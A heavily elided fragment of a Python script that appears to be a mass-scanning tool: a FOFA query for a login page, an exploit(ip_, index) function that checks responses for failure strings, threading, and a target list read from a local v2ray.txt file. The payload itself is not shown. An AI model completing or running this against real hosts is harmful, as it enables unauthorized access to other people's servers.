...
#fofa:  body='@keydown.enter.native="login"' 
headers = {
...
def exploit(ip_, index):
    try:
        ...
        # if "错误" in res.text or "wrong" in res.text or res.status_code!=200:
...
threads = []
with open(r'D:\Downloads\tmp\v2ray.txt', 'r') as file:
